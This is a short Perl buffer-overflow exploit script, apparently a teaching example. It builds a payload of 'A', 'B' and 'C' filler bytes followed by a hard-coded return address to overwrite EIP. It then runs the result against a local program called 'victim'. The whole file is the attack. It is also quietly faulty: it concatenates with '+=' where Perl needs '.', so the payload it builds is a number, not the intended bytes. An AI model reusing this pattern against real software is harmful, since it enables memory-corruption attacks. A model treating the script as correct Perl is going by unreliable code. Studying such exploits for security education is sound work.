#!/usr/bin/env perl

# This program is the Perl version of attack.
# It's also GPL'ed:-\


$code = "";
$code += "\x41" x 10;   #buf, fill with 'A'
$code += "\x42" x 4;	#variable "x", fill with 'B'
$code += "\x43" x 4;	# ebp, fill with 'C' 
$code += "\x82\x84\x04\x08"; #eip, change the correct address for your machine 

$ret = `./victim $code`;

print $ret . "\n";
